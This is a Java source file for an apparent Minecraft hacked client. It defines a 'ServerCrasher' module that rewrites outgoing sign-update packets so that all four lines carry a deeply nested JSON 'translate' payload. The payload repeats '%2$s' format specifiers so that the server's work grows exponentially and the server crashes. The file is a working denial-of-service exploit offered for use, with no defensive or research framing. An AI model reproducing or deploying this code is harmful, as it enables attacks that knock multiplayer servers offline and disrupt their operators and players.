package moe.ichinomiya.naven.modules.impl.misc;

import moe.ichinomiya.naven.events.api.EventTarget;
import moe.ichinomiya.naven.events.api.types.EventType;
import moe.ichinomiya.naven.events.impl.EventPacket;
import moe.ichinomiya.naven.modules.Category;
import moe.ichinomiya.naven.modules.Module;
import moe.ichinomiya.naven.modules.ModuleInfo;
import net.minecraft.network.play.client.C12PacketUpdateSign;

@ModuleInfo(name = "ServerCrasher", description = "Crashes the server", category = Category.MISC)
public class ServerCrasher extends Module {
    private static final String payload = "{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s\",\"with\":[\"a\", \"a\"]}]}]}]}]}]}]}]}";

    @EventTarget
    public void onPacket(EventPacket e) {
        if (e.getType() == EventType.SEND && e.getPacket() instanceof C12PacketUpdateSign) {
            C12PacketUpdateSign packet = (C12PacketUpdateSign) e.getPacket();
            packet.getLines()[0] = new net.minecraft.util.ChatComponentText(payload);
            packet.getLines()[1] = new net.minecraft.util.ChatComponentText(payload);
            packet.getLines()[2] = new net.minecraft.util.ChatComponentText(payload);
            packet.getLines()[3] = new net.minecraft.util.ChatComponentText(payload);
        }
    }
}
